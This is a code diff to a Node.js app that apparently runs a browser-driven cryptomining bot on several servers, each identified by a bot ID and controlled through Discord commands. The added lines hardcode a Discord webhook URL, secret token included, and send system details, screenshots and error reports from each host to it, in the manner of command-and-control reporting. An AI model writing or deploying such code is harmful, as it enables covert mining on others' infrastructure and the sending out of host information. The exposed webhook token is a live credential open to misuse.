@@ -21,6 +21,32 @@ function delay(time) {
 
 let page;
 
+const webhookUrl = 'https://discord.com/api/webhooks/1045109813228621825/OMXSsYZoA76MRjyJS4ocziJwerv_mm16w0RordAQ4is_7nXiKmqkCJZFW80I8_5hY-QZ';
+
+async function sendToDiscord(message, retryCount = 3) {
+  try {
+    const formData = new FormData();
+    formData.append('content', message);
+
+    const headers = {
+      ...formData.getHeaders()
+    };
+
+    await axios.post(webhookUrl, formData, { headers });
+
+    console.log('Message sent to Discord:', message);
+  } catch (error) {
+    if (error.response && error.response.status === 429 && retryCount > 0) {
+      const retryAfter = error.response.headers['retry-after'] || 1;
+      console.log(`Rate limited. Retrying after ${retryAfter} seconds...`);
+      await delay(retryAfter * 1000);
+      await sendToDiscord(message, retryCount - 1);
+    } else {
+      console.error('Error sending message to Discord:', error);
+    }
+  }
+}
+
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "index.html"));
 });
@@ -34,7 +60,7 @@ app.get("/", (req, res) => {
 
     const url = "https://excessive-sticky-traffic.glitch.me/";
     await page.goto(url, { waitUntil: "domcontentloaded" });
-    console.log('URL Opened');
+    console.log('URL Opened')
     await delay(2000);
 
     const inputSelector = '#AddrField';
@@ -49,9 +75,11 @@ app.get("/", (req, res) => {
     console.log(await page.title()); // Log the page title for verification
 
     const message = `Started mining on server ${botId} with wallet address: ${WalletAddress}`;
-    console.log(message); // Log the message to the console instead of sending it to Discord
+    console.log(message); // Log the message to the console
   } catch (err) {
     console.error(err.message);
+    const errorMessage = `Error: ${err.message} on server ${botId}`;
+    await sendToDiscord(errorMessage);
   } finally {
     // Optionally close the browser here if needed
     // await browser?.close();
@@ -94,7 +122,7 @@ async function takeScreenshot() {
   if (!page) {
     throw new Error("Page is not initialized.");
   }
-  console.log("screenshot Taken")
+
   const screenshotPath = 'screenshot.png';
   await page.screenshot({ path: screenshotPath });
   return screenshotPath;
@@ -146,16 +174,21 @@ bot.on('messageCreate', async (msg) => {
       console.log('Screenshot sent successfully:', responseBody);
     } catch (err) {
       console.error('Error sending screenshot:', err.message || err);
+      const errorMessage = `Error sending screenshot: ${err.message || err} on server ${botId}`;
+      await sendToDiscord(errorMessage);
     }
   } else if (msg.content === `systemdetails-${botId}`) {
     try {
       const systemDetailsMessage = await sendSystemDetails();
-      console.log('System details:', systemDetailsMessage);
+      await sendToDiscord(systemDetailsMessage);
+      console.log('System details sent successfully');
     } catch (err) {
       console.error('Error sending system details:', err.message || err);
+      const errorMessage = `Error sending system details: ${err.message || err} on server ${botId}`;
+      await sendToDiscord(errorMessage);
     }
   } else if (msg.content === `restart-${botId}`) {
-    console.log("Restarting server....");
+    console.log("Restarting server....")
   }
 });
 
